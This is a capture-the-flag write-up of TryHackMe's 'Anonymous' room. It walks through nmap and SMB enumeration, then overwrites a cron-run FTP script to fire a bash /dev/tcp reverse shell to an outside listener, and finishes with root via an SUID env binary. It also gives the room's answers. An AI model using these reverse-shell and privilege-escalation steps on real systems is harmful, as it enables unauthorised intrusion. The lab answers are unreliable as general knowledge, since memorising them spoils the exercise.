---
title: "TryHackMe - Anonymous Writeup"
date: 2025-07-03
categories: [Capture The Flags, tryHackMe]
tags: [CTF, Writeups, tryHackMe, Privilege Escalation]
---

![Challenge picture](/assets/img/tryHackMe/anonymous/main.png)

*Room link: https://tryhackme.com/room/anonymous*

*Rating: medium*

---

## Challenge's Summary

Anonymous is a beginner friendly room, in which the user’s enumeration and privilege escalation skills are tested

Tools used: nmap, smbclient, netcat

---

## 1. Getting Started with Nmap scan

**Target IP: 10.10.217.99**

```bash
nmap -T4 -A -p- 10.10.217.99
```

T4: Timing template

A: Performs OS Detection, Service Detection, and traceroute scans

-p-: scan all ports


![nmap result 1](/assets/img/tryHackMe/anonymous/nmap1.png)

![nmap result 2](/assets/img/tryHackMe/anonymous/nmap2.png)


*Important Information:*

*anonymous login allowed on port 21, and it is also writeable, that means we as an attacker can put malicious files in the target system*

Ports open:

21 ftp: vsftpd 2.0.8 or later

22 ssh: OpenSSH 7.6p1


139 netbios-ssn Samba smbd 3.X — 4.X (workgroup: WORKGROUP)

445 netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

**Question 1. Enumerate the machine. How many ports are open? 4**

**Question 2. What service is running on port 21? ftp**

**Question 3. What service is running on ports 139 and 445? smb**

---

## 2. SMB Enumeration

To get the share’s information, there are multiple ways to do it such as using enum4linux, nmap scripts, smbclient. Here, I proceeded with the smbclient tool

```bash
smbclient -L //10.10.217.99 -N  
```

![smb](/assets/img/tryHackMe/anonymous/smb.png)

**Question 4. There’s a share on the user’s computer. What’s it called? pics**

---

## 3. Gaining access to the target via FTP

Since, port 21 allowed anonymous login and it has writeable permissions too, my first step to gain access to the target was using the ftp service

![ftp 1](/assets/img/tryHackMe/anonymous/ftp1.png)

As seen, there is a scripts directory present with all the permission, so let’s get into the directory and proceed further

![ftp 2](/assets/img/tryHackMe/anonymous/ftp2.png)

*Files found:*

*clean.sh*

*removes_files.log*

*to_do.txt*

My next immediate step was to download these 3 files into my system and see their content

```bash
get clean.sh
get removed_files.log
get to_do.txt
```

## 3.1 Analysing files content

Checking their content:

![to_do.txt](/assets/img/tryHackMe/anonymous/todo.png)

![clean.sh](/assets/img/tryHackMe/anonymous/clean.png)

Looking at the bash script, it can be seen that the script is checking the /tmp folder and clean it up, upon which the result is stored in removed_files.log

Upon checking the removed_files.log, there was only one line which was repeated multiple times:


*Running cleanup script: nothing to delete
Running cleanup script: nothing to delete
Running cleanup script: nothing to delete
Running cleanup script: nothing to delete
Running cleanup script: nothing to delete..*

This tells me that a cronjob is setup to run the clean.sh script every minute or two and that the clean.sh script is not working as it should be.

Why so? because there is a syntax error in the if loop
*if [ $tmp_files=0]* instead of the comparing the variable to 0, it is assigning the value 0 to it


## 4. Getting the shell

Since I can upload files to the scripts directory and a cronjob is running clean.sh file every minute or two, I first created a rev.sh file, which upon running will setup a reverse shell on my machine, uploaded this file in the scripts directory and then created a new clean.sh file which executes this rev.sh. Now, when the crontab runs the clean.sh, the clean.sh will then execute the rev.sh and I will get my shell

1. created a new rev.sh to create a reverse shell connection

```bash
bash -i >& /dev/tcp/10.10.37.20/4444 0>&1
```

2. modified the clean.sh to assign $tmp_files="rev.sh"

![modified_clean.sh](/assets/img/tryHackMe/anonymous/modified_clean.png)

## 4.1 Putting the 2 files in the ftp directory

![putting in ftp dir](/assets/img/tryHackMe/anonymous/ftp_put.png)

## 4.2 Setting up netcat

As soon as I setup a listener on my machine, I got the shell

```bash
nc -lnvp 4444
```

l: listen mode

n: no DNS resolution

v: verbose mode

p: port number to which it should listen


![shell](/assets/img/tryHackMe/anonymous/shell.png)

## 4.3 User flag

![user.txt](/assets/img/tryHackMe/anonymous/user.png)

Got the user flag from here which is the answer to Q5

---

## 5. Privilege Escalation

Checking for SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid result](/assets/img/tryHackMe/anonymous/SUID.png)

The most interesting one out of these was the env binary. Using gtfobins, I got to know that if env is set with SUID bit then it can be used to gain root access

![env suid](/assets/img/tryHackMe/anonymous/env.png)

```bash
/usr/bin/env /bin/bash -p
```

*-p: tells the system to run the /bin/bash command with the privileges of /usr/bin/env*

## 5.1 Root shell

![root shell](/assets/img/tryHackMe/anonymous/root.png)

and boom, got the root shell

Extracting the flag:

```bash
cd /root
cat root.txt
```
![root flag](/assets/img/tryHackMe/anonymous/root_flag.png)

Challenge solved!

Hope you enjoyed reading it!





